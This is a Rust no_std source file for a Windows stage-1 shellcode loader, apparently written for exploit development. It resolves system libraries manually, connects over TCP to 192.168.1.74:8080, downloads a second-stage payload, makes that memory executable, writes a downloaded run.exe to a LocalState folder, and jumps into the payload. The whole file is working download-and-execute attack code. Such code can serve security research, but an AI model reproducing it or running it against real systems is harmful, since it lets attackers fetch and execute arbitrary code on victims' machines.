#![feature(allocator_api)]
#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(non_upper_case_globals)]
#![allow(overflowing_literals)]
#![no_std]
#![no_main]

use windows_sys::Win32::Foundation::GENERIC_WRITE;

use core::ffi::c_void;
use core::mem::MaybeUninit;
use core::panic::PanicInfo;
use core::{arch::asm, ffi::c_int};

use shellcode_utils::allocators::WinVirtualAlloc;
use shellcode_utils::prelude::*;
use windows_sys::Win32::Networking::WinSock::{
    AF_INET, IN_ADDR, IPPROTO_TCP, SOCKADDR_IN, SOCK_STREAM, WSADATA,
};

#[panic_handler]
fn panic(_info: &PanicInfo) -> ! {
    loop {}
}

type Stage2Fn = fn() -> u64;

const STAGE2_ENV_FILENAME: &str = concat!(r#"%LOCALAPPDATA%\..\LocalState\run.exe"#, "\0");

// 404 (not found error codes)
const STAGE1_KERNELBASE_NOT_FOUND: u64 = 0x100001404;
const STAGE1_WS2_NOT_FOUND: u64 = 0x100002404;

const STAGE1_READ_STAGE2_LEN_FAILED: u64 = 0x10000002;
const STAGE1_READ_STAGE2_FAILED: u64 = 0x10000003;

const STAGE1_READ_EXE_LEN_FAILED: u64 = 0x10000004;
const STAGE1_READ_EXE_FAILED: u64 = 0x10000005;

#[used]
#[no_mangle]
// Required because compiler_builtins expects this symbol to be present
// and they only define it for UEFI environments
pub static _fltused: i32 = 0;

#[no_mangle]
pub extern "C" fn main() -> u64 {
    unsafe { asm!("and rsp, ~0xf") };

    // Kernelbase is required for just about everything
    let kernelbase_ptr = get_kernelbase();
    if kernelbase_ptr.is_none() {
        return STAGE1_KERNELBASE_NOT_FOUND;
    }
    let kernelbase_ptr = kernelbase_ptr.unwrap();

    // Get WS2 so that we can use sockets
    let ws2_ptr = get_ws2_32(kernelbase_ptr);
    if ws2_ptr.is_none() {
        return STAGE1_WS2_NOT_FOUND;
    }
    let ws2_ptr = ws2_ptr.unwrap();

    // Kernelbase imports
    let VirtualAlloc = fetch_virtual_alloc(kernelbase_ptr);
    let VirtualFree = fetch_virtual_free(kernelbase_ptr);
    let VirtualProtect = fetch_virtual_protect(kernelbase_ptr);
    let CreateFile = fetch_create_file(kernelbase_ptr);
    let ReadFile = fetch_read_file(kernelbase_ptr);
    let WriteFile = fetch_write_file(kernelbase_ptr);
    let CloseHandle = fetch_close_handle(kernelbase_ptr);
    let ExpandEnvironmentStringsA = fetch_expand_environment_strings(kernelbase_ptr);
    // Only used on PC for debugging with WinDbg attached
    #[cfg(feature = "debug")]
    let OutputDebugStringA = fetch_output_debug_string(kernelbase_ptr);

    // WS2 imports
    let wsa_startup = fetch_wsa_startup(ws2_ptr);
    let wsa_socket = fetch_wsa_socket(ws2_ptr);
    let wsa_connect = fetch_wsa_connect(ws2_ptr);
    let inet_addr = fetch_inet_addr(ws2_ptr);

    macro_rules! debug_print {
        ($msg:expr) => {
            #[cfg(feature = "debug")]
            unsafe {
                OutputDebugStringA(concat!($msg, "\n\0").as_ptr() as _)
            }
        };
    }
    debug_print!("Hello from stage1");

    // Try to create run.exe
    let mut stage2_filename: MaybeUninit<[u8; 200]> = MaybeUninit::uninit();
    unsafe {
        (ExpandEnvironmentStringsA)(
            STAGE2_ENV_FILENAME.as_ptr(),
            stage2_filename.as_mut_ptr() as *mut _,
            core::mem::size_of_val(&stage2_filename) as u32,
        );
    }

    let stage2_data = unsafe {
        let exe_handle = (CreateFile)(
            stage2_filename.as_ptr() as *const _, // Filename
            GENERIC_WRITE,                        // Desired access
            0,                                    // ShareMode
            core::ptr::null_mut() as PVOID,       // Security attributes
            2,                                    // CREATE_ALWAYS
            0x80,                                 // FILE_ATTRIBUTE_NORMAL
            core::ptr::null_mut() as PVOID,       // hTemplateFile
        );

        let mut wsa_data: MaybeUninit<WSADATA> = MaybeUninit::uninit();
        (wsa_startup)((2 << 8) | 2, wsa_data.as_mut_ptr());

        let socket = (wsa_socket)(
            AF_INET as c_int,
            SOCK_STREAM,
            IPPROTO_TCP,
            core::ptr::null(),
            core::ptr::null(),
            0,
        );

        let sockaddr = SOCKADDR_IN {
            sin_family: AF_INET,
            sin_port: u16::from_le_bytes(8080u16.to_be_bytes()),
            sin_addr: IN_ADDR {
                S_un: windows_sys::Win32::Networking::WinSock::IN_ADDR_0 {
                    S_addr: (inet_addr)(concat!("192.168.1.74", "\0").as_ptr() as *const _),
                },
            },
            sin_zero: [0u8; 8],
        };

        (wsa_connect)(
            socket,
            core::mem::transmute(&sockaddr),
            core::mem::size_of_val(&sockaddr) as i32,
            core::ptr::null(),
            core::ptr::null_mut(),
            core::ptr::null(),
            core::ptr::null(),
        );

        let mut bytes_read = 0u32;

        let mut stage2_len_bytes = [0u8; 4];
        if (ReadFile)(
            socket as *mut _,
            stage2_len_bytes.as_mut_ptr() as *mut _,
            core::mem::size_of_val(&stage2_len_bytes) as u32,
            &mut bytes_read as *mut _,
            core::ptr::null_mut(),
        ) == 0
        {
            return STAGE1_READ_STAGE2_LEN_FAILED;
        }

        let stage2_len = u32::from_be_bytes(stage2_len_bytes) as usize;

        let stage2_mem = (VirtualAlloc)(core::ptr::null(), stage2_len, 0x00001000, 0x4);
        if (ReadFile)(
            socket as *mut _,
            stage2_mem,
            stage2_len as u32,
            &mut bytes_read as *mut _,
            core::ptr::null_mut(),
        ) == 0
            || bytes_read != stage2_len as u32
        {
            return STAGE1_READ_STAGE2_FAILED;
        }

        let mut run_exe_len_bytes = [0u8; 4];
        if (ReadFile)(
            socket as *mut _,
            run_exe_len_bytes.as_mut_ptr() as *mut _,
            core::mem::size_of_val(&run_exe_len_bytes) as u32,
            &mut bytes_read as *mut _,
            core::ptr::null_mut(),
        ) == 0
        {
            return STAGE1_READ_EXE_LEN_FAILED;
        }

        let run_exe_len = u32::from_be_bytes(run_exe_len_bytes) as usize;
        let run_exe_mem = (VirtualAlloc)(core::ptr::null(), run_exe_len, 0x00001000, 0x4);

        let mut remaining = run_exe_len as isize;
        while remaining > 0 {
            if (ReadFile)(
                socket as *mut _,
                run_exe_mem.offset(run_exe_len as isize - remaining) as *mut _,
                remaining as u32,
                &mut bytes_read as *mut _,
                core::ptr::null_mut(),
            ) == 0
            {
                return STAGE1_READ_EXE_FAILED;
            }

            remaining -= bytes_read as isize;
        }

        // Change the stage 2 payload's permissions to be executable
        debug_print!("Changing stage2 permissions");
        let mut old_flags = 0u32;
        (VirtualProtect)(
            stage2_mem as *const _,
            stage2_len,
            0x20,
            &mut old_flags as *mut _,
        );

        let mut bytes_written = 0u32;

        (WriteFile)(
            exe_handle,
            run_exe_mem as *const _,
            run_exe_len as u32,
            &mut bytes_written as *mut _,
            core::ptr::null_mut(),
        );

        (VirtualFree)(run_exe_mem, 0, 0x00008000);

        (CloseHandle)(exe_handle);
        (CloseHandle)(socket as *mut _);

        stage2_mem
    };

    debug_print!("Executing stage2");

    let stage2: Stage2Fn = unsafe { core::mem::transmute(stage2_data) };
    stage2()
}

// #[allow(unused_attributes)]
// #[cfg(target_env = "msvc")]
// #[link_args = "/GS- /MERGE:.rdata=.text /MERGE:.pdata=.text /NODEFAULTLIB /EMITPOGOPHASEINFO /DEBUG:NONE"]
// extern "C" {}
